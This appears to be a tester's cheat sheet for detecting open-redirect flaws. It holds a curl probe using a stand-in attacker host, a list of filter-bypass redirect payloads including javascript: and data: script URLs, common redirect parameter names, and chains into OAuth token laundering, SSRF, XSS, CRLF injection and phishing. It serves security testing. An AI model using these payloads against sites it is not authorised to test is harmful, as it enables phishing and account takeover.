# Quick reference — the 60-second open-redirect pass

## The probe

```bash
# the canary — follow=False, read the verbatim Location
curl -si --max-time 10 \
  "$BASE/login?next=https%3A%2F%2Fattacker.invalid%2Flanding" \
  | grep -i '^location'
# Location: https://attacker.invalid/landing  -> CANDIDATE
# Location: /                                 -> safe
```

```bash
# the tool sweep
python3 tools/web/redirect_probe.py --url "$BASE/login" --param next
python3 tools/web/redirect_probe.py --selftest
```

## The bypass alphabet (the fast arms)

```text
https://evil.com           //evil.com          /\evil.com
\\evil.com                 /%5cevil.com        https:/\evil.com
https:%2f%2fevil.com       https%3a%2f%2fevil.com
https://target.com@evil.com     evil.com\@target.com
https://evil.com%40target.com   https://target.com.evil.com
https://evil.com/target.com     evil.com?target.com
javascript:alert(1)             data:text/html,<script>...
```

## The fingerprint

| The Location | The meaning |
|---|---|
| `Location: https://evil.com` | no filter — CANDIDATE |
| `Location: /` | forced-relative — filter holds for that arm |
| `Location: https://target.com/...` | a host-force |
| `Location: https://target.com.evil.com` | a suffix/substring gap — the host ends `evil.com` |
| `Location: <partial>` | a path-pass / partial-force |

## The surfaces

```text
next | return | returnTo | goto | continue | to | url | redir |
redirect | redirect_uri | callback | RelayState | dest | target |
link | out | back | prev | ref | post_logout_redirect_uri
```

## The carriers

```text
Location: header   -> the server-side redirect — the verbatim header
meta refresh       -> content="0;url=<param>"
JS nav             -> location.href/replace/assign/<param>
location.hash      -> a fragment-carried param
Refresh: header    -> a header-carried non-Location redirect
```

## The chain

```text
open-redirect -> OAuth redirect_uri launder -> web-oauth-sso
open-redirect -> fetcher-follows-Location   -> web-ssrf
open-redirect -> javascript:/data: sink     -> web-xss
open-redirect -> bot-visit                  -> the bot chain
open-redirect -> a trusted-domain phishing  -> the class's own answer
open-redirect -> %0d%0a in the Location     -> CRLF/header-injection
```

## The verdicts

| The observation | The verdict |
|---|---|
| `Location: https://evil.com` verbatim | CANDIDATE — post-probe confirms |
| `Location: <safe>` on all arms | the class falsifier |
| no `Location` on the param | weak-negative — the param name is wrong |
| the meta/JS carries the canary | a client-side-twin candidate |
| `Location:` carries the canary but no chain | the class confirms; the launder is the next question |
